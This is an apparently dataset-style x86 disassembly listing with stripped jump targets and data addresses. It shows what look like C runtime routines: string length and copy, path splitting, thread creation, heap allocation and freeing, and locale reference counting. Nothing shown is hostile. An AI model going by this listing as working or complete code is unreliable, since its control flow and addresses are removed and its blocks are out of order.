lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000e924
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000e924
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
mov eax esi
pop esi
sub_1000b9b0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_1000ba3b
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp ecx edi
je r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov edx [ ebp + 0xc ]
cmp edx edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
mov eax [ ebp + 0x14 ]
cmp eax edi
je r-xdata
cmp [ ebp + 0x10 ] edi
jbe r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0x1c ]
cmp eax edi
je r-xdata
cmp [ ebp + 0x18 ] edi
jbe r-xdata
xor eax eax
mov [ edx ] ax
cmp [ ebp + 0x18 ] edi
je r-xdata
cmp [ ebp + 0x18 ] edi
jne r-xdata
mov eax [ ebp + 0x24 ]
cmp eax edi
je r-xdata
cmp [ ebp + 0x20 ] edi
jbe r-xdata
xor edx edx
mov [ eax ] dx
cmp [ ebp + 0x1c ] edi
jne r-xdata
jmp r-xdata
cmp ecx edi
jne r-xdata
cmp [ ebp + 0x28 ] edi
jbe r-xdata
xor edx edx
mov [ eax ] dx
cmp [ ebp + 0x20 ] edi
je r-xdata
cmp [ ebp + 0x20 ] edi
jne r-xdata
call sub_1000e8db
cmp [ ebp - 0x4 ] edi
jne r-xdata
call sub_1000e8db
xor edx edx
mov [ eax ] dx
cmp [ ebp + 0x24 ] edi
jne r-xdata
jmp r-xdata
push 0x16
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_1000e873
add esp 0x14
mov eax esi
jmp r-xdata
push 0x22
pop ecx
mov [ eax ] ecx
mov eax ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x28 ] edi
jne r-xdata
cmp [ ebp + 0x28 ] edi
jne r-xdata
xor eax eax
inc eax
mov esi ecx
cmp [ esi ] 0x3a
jne r-xdata
dec eax
inc esi
inc esi
cmp eax edi
ja r-xdata
cmp edx edi
je r-xdata
cmp edx edi
je r-xdata
cmp [ esi ] di
je r-xdata
movzx eax [ ecx ]
xor ebx ebx
mov esi ecx
test ax ax
je r-xdata
xor eax eax
mov [ edx ] ax
add esi 0x2
mov [ ebp + 0x8 ] esi
mov ecx esi
jmp r-xdata
cmp [ ebp + 0x10 ] 0x3
jb r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
movzx eax ax
cmp edx edi
je r-xdata
push 0x2
push ecx
push 0xffffffff
push edx
call sub_10012438
add esp 0x10
test ebx ebx
je r-xdata
xor edx edx
mov [ eax ] dx
lea edi [ esi + 0x2 ]
cmp ax 0x5c
je r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
cmp ebx ecx
jb r-xdata
cmp ax 0x2f
je r-xdata
test edi edi
je r-xdata
cmp ax 0x2e
jne r-xdata
mov eax [ ebp + 0x24 ]
test eax eax
je r-xdata
sub esi ecx
sar esi 0x1
cmp [ ebp + 0x20 ] esi
ja r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
inc esi
inc esi
movzx eax [ esi ]
test ax ax
jne r-xdata
mov ebx esi
jmp r-xdata
xor eax eax
xor ecx ecx
mov [ eax ] cx
push esi
push ecx
push 0xffffffff
push [ ebp + 0x1c ]
call sub_10012438
add esp 0x10
xor edi edi
cmp [ ebp + 0x24 ] 0x0
je r-xdata
mov eax ebx
sub eax ecx
sar eax 0x1
cmp [ ebp + 0x20 ] eax
jbe r-xdata
mov [ ebp + 0x8 ] edi
mov ecx edi
jmp r-xdata
mov eax edi
sub eax ecx
sar eax 0x1
cmp [ ebp + 0x18 ] eax
jbe r-xdata
sub esi ebx
sar esi 0x1
cmp [ ebp + 0x28 ] esi
jbe r-xdata
push eax
push ecx
push 0xffffffff
push [ ebp + 0x1c ]
call sub_10012438
mov ecx [ ebp + 0x8 ]
add esp 0x10
push eax
push ecx
push 0xffffffff
push [ ebp + 0x14 ]
call sub_10012438
add esp 0x10
push esi
push ebx
push 0xffffffff
push [ ebp + 0x24 ]
call sub_10012438
add esp 0x10
jmp r-xdata
sub_1000bc56
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
neg ecx
sbb ecx ecx
mov eax 0x100
and ecx eax
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
neg ecx
sbb ecx ecx
and ecx eax
push ecx
mov ecx [ ebp + 0x10 ]
push [ ebp + 0x14 ]
neg ecx
sbb ecx ecx
and ecx eax
mov eax [ ebp + 0xc ]
push ecx
push [ ebp + 0x10 ]
neg eax
sbb eax eax
and eax 0x3
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000ba3b
add esp 0x24
pop ebp
retn
sub_1000bcb0
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_1000bcc0
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edi edi
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_1000bda8
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_1000e2ca
test eax eax
je r-xdata
push r--data
call sub_100125a0
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call [ ExitThread@IAT ]
push eax
call sub_1000e48c
pop ecx
call [ r--data ]
sub_1000be26
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1000e155
call sub_1000e14f
push eax
call sub_1000e135
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x54 ]
mov [ eax + 0x54 ] edx
mov edx [ ecx + 0x58 ]
mov [ eax + 0x58 ] edx
mov edx [ ecx + 0x4 ]
push ecx
mov [ eax + 0x4 ] edx
call sub_1000e35d
mov esi [ ebp + 0x8 ]
push esi
call sub_1000e14f
push eax
call sub_1000e189
test eax eax
jne r-xdata
call sub_1000bde5
push r--data
call sub_100125a0
pop ecx
test eax eax
je r-xdata
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call [ ExitThread@IAT ]
call [ r--data ]
cmp [ r--data ] 0x0
je r-xdata
sub_1000bea9
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp edi ebx
jne r-xdata
push esi
call sub_1000e155
push 0x214
push 0x1
call sub_10011a2a
mov esi eax
pop ecx
pop ecx
cmp esi ebx
je r-xdata
call sub_1000e8db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
xor eax eax
jmp r-xdata
push esi
call sub_1000bf59
pop ecx
cmp [ ebp - 0x4 ] ebx
je r-xdata
call sub_1000e343
push [ eax + 0x6c ]
push esi
call sub_1000e1e3
mov eax [ ebp + 0x14 ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi + 0x58 ] eax
mov eax [ ebp + 0x1c ]
pop ecx
pop ecx
mov [ esi + 0x54 ] edi
cmp eax ebx
jne r-xdata
pop edi
pop ebx
leave
retn
xor eax eax
push [ ebp - 0x4 ]
call sub_1000e901
pop ecx
push eax
push [ ebp + 0x18 ]
push esi
push sub_1000be26
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateThread@IAT ]
cmp eax ebx
jne r-xdata
lea eax [ ebp + 0x10 ]
pop esi
call [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
sub_1000bf59
push 0xc
push r--data
call sub_10011ecc
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10011f11
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_100129fe
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_10012a31
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_1000e8db
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1000e899
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000bfaf
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_10012a61
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_1000bfe7
push 0xc
push r--data
call sub_10011ecc
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_10011f11
retn
push 0x4
call sub_100129fe
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_10013210
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000c02d
sub_1000c036
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_100122c2
pop ecx
call sub_1000e8db
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
mov edi [ HeapAlloc@IAT ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_100136a0
push 0x1e
call sub_100134f5
push 0xff
call sub_10011c3d
cmp eax 0x3
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
push esi
call sub_1000bfe7
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
mov eax esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
inc esi
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push [ rw-data ]
call edi
push eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
pop esi
pop ebp
retn
call sub_1000e8db
mov [ eax ] esi
push [ ebp + 0x8 ]
call sub_100122c2
pop ecx
test eax eax
je r-xdata
call sub_1000e8db
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub_1000c100
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_1000e8db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp eax 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
add eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_1000e8db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
dec [ ebp - 0x1c ]
js r-xdata
push edi
push [ ebp + 0x18 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_10010e4d
add esp 0x10
mov edi eax
cmp esi ebx
je r-xdata
pop esi
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000e924
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000e924
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
mov eax edi
sub_1000c1f1
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_1000bf59
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_1000bf59
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_1000bf59
push [ esi + 0xc0 ]
call sub_1000bf59
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_10013af4
push [ edi ]
call sub_1000bf59
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_1000bf59
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_1000bf59
pop ecx
push [ esi + 0xb0 ]
call sub_1000bf59
push [ esi + 0xbc ]
call sub_1000bf59
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_1000bf59
push [ esi + 0xbc ]
call sub_10013f11
pop ecx
pop ecx
push eax
call sub_1000bf59
pop ecx
push eax
call sub_1000bf59
push [ esi + 0xbc ]
call sub_10013d02
pop ecx
pop ecx
sub_1000c33a
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_1000c3c9
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_1000c462
mov edi edi
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x36
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_1000c33a
pop ecx
pop edi
sub_1000c488
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_1000c33a
pop ecx
test esi esi
je r-xdata
push esi
call sub_1000c3c9
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_1000c1f1
pop ecx
sub_1000c4c6
push 0xc
push r--data
call sub_10011ecc
call sub_1000e343
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_100129fe
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_1000c488
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000c530
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_1000e343
mov esi [ eax + 0x6c ]
mov eax esi
call sub_10011f11
retn
push 0x20
call sub_10011be9
pop ecx
sub_1000c53c
mov eax [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0x8 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xa8 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xd4 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xbc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rw-data ] ecx
mov eax [ eax + 0xac ]
mov [ rw-data ] eax
retn
sub_1000c58f
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
cmp edi ebx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esi [ ebp + 0x10 ]
dec edi
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000e74b
add esp 0x14
add esi 0x4
push [ esi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001462a
add esp 0xc
test eax eax
je r-xdata
pop esi
sub_1000c5cf
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x90
xor ebx ebx
push ebx
push edi
call sub_1000b660
mov esi [ ebp + 0xc ]
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
mov [ ebp + 0xc ] ebx
call sub_100146a0
cmp eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
pop ecx
pop ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x80 ]
push 0x10
push eax
call sub_100146e6
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ eax + esi ]
mov bl [ edi ]
jne r-xdata
or eax 0xffffffff
mov [ edi + 0x8f ] bl
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000e74b
add esp 0x14
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp bl 0x2e
je r-xdata
cmp eax 0x10
jae r-xdata
cmp bl 0x5f
je r-xdata
push eax
push esi
push 0x40
push [ ebp + 0x8 ]
jmp r-xdata
test bl bl
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x40
add eax 0x40
jmp r-xdata
call sub_100146e6
add esp 0x10
test eax eax
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x10
sub eax 0xffffff80
cmp bl 0x2c
jne r-xdata
push eax
cmp bl 0x2c
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000e74b
add esp 0x14
test bl bl
je r-xdata
inc [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
push r--data
push esi
call sub_100146a0
test eax eax
sub_1000c6f8
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001479b
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
lea eax [ esi + 0x40 ]
cmp [ eax ] bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000e74b
add esp 0x14
lea eax [ esi + 0x80 ]
cmp [ eax ] bl
pop esi
pop ebx
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000c58f
add esp 0x14
pop ebp
retn
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000c58f
add esp 0x14
sub_1000c765
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
inc ebx
push 0x355
mov [ ebp - 0x10 ] ebx
call sub_100119e5
pop ecx
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
push edi
lea edi [ eax + 0x4 ]
mov [ edi ] 0x0
mov [ eax ] ebx
mov [ ebp - 0x8 ] ebx
lea ebx [ esi + 0x10 ]
lea eax [ ebx + 0x48 ]
push [ eax ]
mov [ ebp - 0xc ] eax
push r--data
push [ r--data ]
push 0x3
push 0x351
push edi
call sub_1000c58f
mov eax [ ebp - 0xc ]
add esp 0x18
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] r--data
push [ ebx + 0x58 ]
mov eax [ ebp - 0xc ]
push [ eax ]
call sub_100123b0
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000e74b
add esp 0x14
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
add [ ebp - 0x4 ] 0xc
shl eax 0x4
lea ebx [ eax + esi ]
lea eax [ ebx + 0x48 ]
push [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push r--data
push [ eax ]
push 0x3
push 0x351
push edi
call sub_1000c58f
add esp 0x18
cmp [ ebp - 0x4 ] r--data
jl r-xdata
and [ ebp - 0x10 ] 0x0
push r--data
push 0x351
push edi
call sub_1001462a
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push [ ebp - 0x14 ]
call sub_1000bf59
mov eax [ esi + 0x50 ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov ebx [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
jne r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ esi + 0x68 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x48 ] ebx
push eax
call edi
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_1000bf59
pop ecx
mov eax [ ebp - 0x14 ]
and [ esi + 0x54 ] 0x0
and [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] eax
mov [ esi + 0x48 ] edi
mov eax edi
jmp r-xdata
push eax
call ebx
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_1000bf59
pop ecx
push [ esi + 0x54 ]
call sub_1000bf59
pop ecx
pop edi
push [ esi + 0x54 ]
call sub_1000bf59
pop ecx
sub_1000c8e2
mov edi edi
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0xa0 ] eax
call sub_1000e343
add eax 0x9c
lea ecx [ eax + 0x28 ]
mov [ ebp - 0xac ] ecx
lea ecx [ eax + 0x2c ]
lea ebx [ eax + 0x20 ]
add eax 0xaf
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x98 ] eax
test esi esi
je r-xdata
xor eax eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_1000b9b0
mov edi 0x83
pop ecx
mov [ ebp - 0xb0 ] eax
cmp eax edi
jae r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
and [ ebp - 0xb4 ] 0x0
lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_1000c5cf
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x98 ]
call sub_100123b0
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_1001479b
add esp 0xc
xor esi esi
test eax eax
je r-xdata
lea eax [ ebp - 0x94 ]
push eax
push ebx
push eax
call sub_10014dbe
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
push [ ebp - 0xa8 ]
call sub_100123b0
pop ecx
pop ecx
test eax eax
je r-xdata
cmp edi esi
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1000e74b
add esp 0x14
movzx eax [ ebx + 0x4 ]
mov ecx [ ebp - 0xac ]
mov [ ecx ] eax
lea eax [ ebp - 0x94 ]
push eax
push edi
push [ ebp - 0x98 ]
call sub_1000c6f8
add esp 0xc
cmp [ esi ] 0x0
